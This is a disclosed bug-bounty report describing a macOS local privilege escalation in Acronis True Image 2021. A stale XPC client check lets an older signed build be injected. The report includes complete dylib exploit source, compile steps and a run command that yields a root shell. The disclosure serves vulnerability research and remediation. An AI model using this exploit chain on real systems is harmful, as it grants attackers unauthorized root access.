# True Image 2021 - LPE via XPC service communication

## Report Details
- **Report ID**: 966494
- **URL**: https://hackerone.com/reports/966494
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-08-25T07:05:32.149Z
- **Disclosed**: 2021-02-23T07:19:48.576Z

## Reporter
- **Username**: theevilbit
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
This is a follow up of #908152. The bug reported there wasn't fixed properly, and as you don't see it, I consider this as new. In the good faith that you will not close this as duplicate submitting this. Also hoping for a bit more bounty than the 200$... 
The privilege helper tool only validates the code signature of the client, but not the version. This allows someone to use the old version of True Image, 2020, which is vulnerable to injection. Injecting code into the 2020 version allows to talk to the 2021 version XPC service, which will allow LPE.

## Steps To Reproduce

Get the old version of the app and place it into `/Users/Shared/`. The 2021 version is at `/Applications/`.

This is a sample dylib code that can be injected into 2020 version, and talk to the XPC service of 2021.

The priv helper will verify the code signature of the executable to run, we need to provide it with with an Acronis image (this might be vulnerable to race condition as well, TOCTOU issue - we could swap the binary between being verified and executed). Since we can specify environment variables, we can add a DYLD_INSERT_LIBRARIES variable to inject a dylib into an old version of the app, which will satisfy the code signing reqs, and we can also inject code into it.

```
#import <Foundation/Foundation.h>

static NSString* XPCHelperMachServiceName = @"com.acronis.trueimagehelper";

@protocol HelperToolProtocol
- (void)checkFullDiskAccessWithReply:(void (^)(BOOL))arg1;
- (void)executeProcess:(NSString *)arg1 arguments:(NSArray *)arg2 environment:(NSDictionary *)arg3 caller:(int)arg4 withReply:(void (^)(int))arg5;
- (void)executeProcess:(NSString *)arg1 arguments:(NSArray *)arg2 caller:(int)arg3 withReply:(void (^)(int))arg4;
- (void)getProcessIdentifierWithReply:(void (^)(int))arg1;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {

     
         NSString*  service_name = XPCHelperMachServiceName;

         NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];

         NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];

         [connection setRemoteObjectInterface:interface];

         [connection resume];

         id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error)
         {
             NSLog(@"[-] Something went wrong");
             NSLog(@"[-] Error: %@", error);
         }];

         NSLog(@"obj: %@", obj);
         NSLog(@"conn: %@", connection);

    NSString* proc = @"/Users/Shared/Acronis True Image.app/Contents/MacOS/backup_worker";
    NSArray* args = [NSArray arrayWithObjects:@"/Library/hello.txt", nil];
    NSDictionary* env = @{@"DYLD_INSERT_LIBRARIES":@"/Users/Shared/env.dylib"};

    [obj executeProcess:proc arguments:args environment:env caller:1 withReply:^(int i){
            NSLog(@"Response, %d", i);
                 }];
         NSLog(@"Done");
}
```
Compile:
```
gcc -dynamiclib -framework Foundation acronis.m -o acronis.dylib
```
We need another dylib taht we inject into the executable which we run. Its code is:

```
#include <stdlib.h>

__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
	system("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
}
```
Compile:
```
gcc -dynamiclib -framework Foundation env.m -o env.dylib
```

Run:
```
DYLD_INSERT_LIBRARIES=acronis.dylib /Users/Shared/Acronis\ True\ Image.app/Contents/MacOS/Acronis\ True\ Image
```

Once we run it, we will have a Terminal popup as root.

## Impact
Local Privilege Escalation

## Recommendations
Verify the version of the client, like here:
https://github.com/objective-see/LuLu/blob/10e7f719caf0b618b99fceef1a366617662d3b25/launchDaemon/launchDaemon/XPCListener.m
    requirementStringHelper = [NSString stringWithFormat:@"anchor trusted and identifier \"%@\" and certificate leaf [subject.CN] = \"%@\" and info [CFBundleShortVersionString] >= \"1.2.0\"", HELPER_ID, SIGNING_AUTH];

## Impact

LPE

## Attachments
- acronis.m
- acronis.dylib
- env.dylib
- env.m
